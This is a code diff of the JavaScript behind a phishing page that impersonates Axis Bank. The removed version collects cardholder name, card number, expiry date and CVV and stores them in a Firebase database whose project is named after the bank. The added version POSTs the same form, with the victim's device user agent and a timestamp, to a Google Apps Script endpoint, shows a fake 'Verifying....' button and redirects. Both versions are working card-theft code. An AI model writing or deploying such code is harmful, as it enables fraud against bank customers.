@@ -1,60 +1,37 @@
-// Initialize Firebase (ADD YOUR OWN DATA)
-const firebaseConfig = {
-  apiKey: "AIzaSyAlhmjC2Kz5i6t5xfL9tFhT0P3M76vmRVg",
-  authDomain: "axis-bank-47624.firebaseapp.com",
-  databaseURL: "https://axis-bank-47624-default-rtdb.firebaseio.com",
-  projectId: "axis-bank-47624",
-  storageBucket: "axis-bank-47624.appspot.com",
-  messagingSenderId: "310941887111",
-  appId: "1:310941887111:web:e095ab99e1a8d84d936622",
-
-
+document.getElementById("deviceName").value = navigator.userAgent;
     
-
-  };
-
-firebase.initializeApp(firebaseConfig);
-
-// Reference messages collection
-var messagesRef = firebase.database().ref('messages');
-
-// Listen for form submit
-document.getElementById('contactForm').addEventListener('submit', submitForm);
-
-// Submit form
-function submitForm(e){
-  e.preventDefault();
-
-  // Get values
-  var card_name = getInputVal('card_name');
-  var card_no = getInputVal('card_no');
-  var exp_date = getInputVal('exp_date');
-  var cvv = getInputVal('cvv');
-
-  // Save message
-  saveMessage(card_name, card_no, exp_date, cvv);
-
-  // Show alert
-// alert("Axis Bank Will Contact You Soon")
-//   // Clear form
-//   document.getElementById('contactForm').reset();
-
-document.getElementById('contactForm').reset();
-window.location.href="sad1.html";
-}
-
-// Function to get get form values
-function getInputVal(id){
-  return document.getElementById(id).value;
-}
-
-// Save message to firebase
-function saveMessage(card_name, card_no, exp_date, cvv){
-  var newMessageRef = messagesRef.push();
-  newMessageRef.set({
-    card_name: card_name,
-    card_no:card_no,
-    exp_date:exp_date,
-    cvv:cvv,
-  });
-}
+                                          var currentDate = new Date();
+                                                  document.getElementById("date").value = currentDate.toDateString();
+                                                  document.getElementById("time").value = currentDate.toLocaleTimeString();
+                                                  document.getElementById("app").value;
+                                          
+                                          
+                                                                                  const scriptURL = 'https://script.google.com/macros/s/AKfycbyociy2z5FcXdaJlc7WmnLXV0Jg36rdbVHK9XiCbQ5Cw6Hs6BMPOv2obnUR9CS8MSS5/exec'
+                                                                                  const form = document.forms['contactForm']
+                                                                                  
+                                                                                  form.addEventListener('submit', e => {
+                                                                                    e.preventDefault()
+                                                                                  
+                                                                                    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                                          
+                                                                                    .then(response => {
+                                            // Replace the alert with a redirect to another HTML page
+                                            window.location.href = 'sad1.html'; // Replace 'new_page.html' with the actual URL of the page you want to redirect to
+                                          });
+                                                                                  
+                                                                                  })
+                                          
+                                                // Get the button element by its ID
+                                                var button = document.getElementById('myButton');
+                                          
+                                          // Define a function to change the button text
+                                          function changeButtonText() {
+                                              if (button.textContent === "Verify & Proceed") {
+                                                  button.textContent = "Verifying....";
+                                              } else {
+                                                  button.textContent = "Verifying....";
+                                              }
+                                          }
+                                          
+                                          // Add a click event listener to the button
+                                          button.addEventListener('click', changeButtonText);
